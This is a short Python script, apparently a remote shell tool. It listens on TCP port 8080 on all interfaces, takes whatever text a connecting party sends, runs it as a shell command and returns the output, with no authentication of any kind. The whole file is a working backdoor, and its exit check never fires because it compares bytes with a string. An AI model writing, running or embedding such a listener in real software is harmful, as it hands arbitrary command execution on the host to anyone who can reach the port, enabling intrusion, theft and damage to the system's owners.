import socket
import sys
from json import dumps
from subprocess import PIPE, run


class Client:

    def __init__(self) -> None:
        self.incomingSocket,self.clientAddress,self.socket=(False,False,False)

    def listen(self):
        try:
            address,port,nofclis= ('',8080,100)
            self.socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.socket.bind((address,port))
            self.socket.listen(nofclis)
            self.socket.settimeout(1000)
            
            print("Listening")
            self.incomingSocket,self.clientAddress=self.socket.accept()
            
            print("Incoming Connnection from "+ self.clientAddress[0])
            

        except:
            print('timeout') 

    def execute(self):
        recdata =self.incomingSocket.recv(20024)
        if recdata.strip() == 'exit':sys.exit()
        terminal=run(recdata.decode(),stdout=PIPE,shell=True,stderr=PIPE,universal_newlines=True)
        self.incomingSocket.send(dumps({'op':terminal.stdout,'err':terminal.stderr}).encode())


client = Client()
client.listen()
while True:
    client.execute()